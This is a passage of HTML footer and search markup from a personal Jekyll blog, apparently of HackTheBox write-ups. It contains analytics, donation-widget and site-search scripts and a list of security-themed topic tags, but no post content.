imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"> <br></br> <script src="https://www.hackthebox.eu/badge/84820"></script></p></div><p class="mb-0"> © 2020 <a href="https://www.facebook.com/prashant.saini.37201">Prashant Saini</a>. <script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','https://www.google-analytics.com/analytics.js','ga'); ga('create', 'UA-157514490-1', 'auto'); ga('send', 'pageview'); </script> <script data-name="BMC-Widget" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="0xprashant" data-description="Support me on Buy me a coffee!" data-message="Like The Blog? Support Me!" data-color="#5F7FFF" data-position="right" data-x_margin="18" data-y_margin="18"></script></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/john/">john</a> <a class="post-tag" href="/tags/wfuzz/">wfuzz</a> <a class="post-tag" href="/tags/cracking-id_rsa/">cracking id_rsa</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/ftp/">ftp</a> <a class="post-tag" href="/tags/ldap/">ldap</a> <a class="post-tag" href="/tags/ldapsearch/">ldapsearch</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="http://localhost:4000{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
